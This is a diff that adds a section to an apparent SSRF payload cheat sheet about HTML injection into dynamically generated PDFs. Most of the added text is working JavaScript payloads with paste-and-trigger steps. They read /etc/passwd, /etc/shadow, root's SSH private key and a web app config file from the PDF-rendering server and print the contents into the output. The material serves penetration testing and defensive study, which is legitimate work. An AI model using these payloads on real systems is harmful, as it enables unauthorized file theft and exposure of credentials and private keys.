@@ -271,6 +271,56 @@ http://169.254.169.254/metadata/instance?api-version=2021-02-01
 
 ---
 
+## SSRF via HTML Injection in Dynamically Generated PDFs
+
+When a web application generates PDFs from user input (e.g., tracking numbers, invoices, reports), injecting HTML/JavaScript can achieve SSRF and local file read.
+
+### Confirm JavaScript Execution
+
+Input into the field that gets rendered in the PDF:
+
+```html
+<script>document.write('TESTING THIS')</script>
+```
+
+If the text appears in the generated PDF, JavaScript is executing during PDF generation.
+
+### Local File Read via XHR
+
+Use `XMLHttpRequest` to read local files from the server generating the PDF:
+
+```html
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)};
+x.open("GET","file:///etc/passwd");
+x.send();
+</script>
+```
+
+Paste this into the input field, trigger PDF generation, and the file contents render in the PDF.
+
+### Other Useful File Targets
+
+```html
+<!-- SSH keys -->
+<script>x=new XMLHttpRequest;x.onload=function(){document.write('<pre>'+this.responseText+'</pre>')};x.open("GET","file:///root/.ssh/id_rsa");x.send();</script>
+
+<!-- Web app config -->
+<script>x=new XMLHttpRequest;x.onload=function(){document.write('<pre>'+this.responseText+'</pre>')};x.open("GET","file:///var/www/html/config.php");x.send();</script>
+
+<!-- /etc/shadow (if running as root) -->
+<script>x=new XMLHttpRequest;x.onload=function(){document.write('<pre>'+this.responseText+'</pre>')};x.open("GET","file:///etc/shadow");x.send();</script>
+```
+
+### References
+
+- [SSRF via HTML Injection in PDF on AWS EC2](https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90)
+- [Local File Read via XSS in Dynamically Generated PDFs](https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/)
+
+---
+
 ## Common SSRF Parameters
 
 ```
